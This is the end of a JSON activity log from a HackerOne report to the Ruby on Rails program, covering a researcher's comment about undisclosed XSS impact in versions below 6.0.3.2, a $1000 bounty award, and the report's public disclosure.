href=\"/jack_mccracken\"\u003e@jack_mccracken\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWill it still take time to decision the bounty?\u003c/p\u003e\n\n\u003cp\u003eRegarding the contents of the release, Is it intentional that it is not disclosed that XSS is possible even in production mode below 6.0.3.2?\u003cbr\u003e\nIf not, I think it\u0026#39;s better to publish the information somewhere.\u003cbr\u003e\nFrom the text at the time of release of 6.0.3.2, 6.0.3.3, 6.0.3.4, I think that some users will delay the release by judging that there is no significant impact.\u003cbr\u003e\n(Actually, there is a version of Gitlab that still uses 6.0.3.1)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-24T22:47:41.640Z","updated_at":"2020-10-24T22:47:41.640Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9892233,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-22T16:46:58.167Z","updated_at":"2020-11-22T16:46:58.167Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10155165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I added the rest to the issue on github.\nhttps://github.com/rails/rails/issues/40892","markdown_message":"\u003cp\u003eI added the rest to the issue on github.\u003cbr\u003e\n\u003ca title=\"https://github.com/rails/rails/issues/40892\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fissues%2F40892\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/issues/40892\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-12-20T05:31:10.198Z","updated_at":"2020-12-20T05:31:10.198Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10159660,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-20T23:58:27.604Z","updated_at":"2020-12-20T23:58:27.604Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10178494,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-22T16:47:02.528Z","updated_at":"2020-12-22T16:47:02.528Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}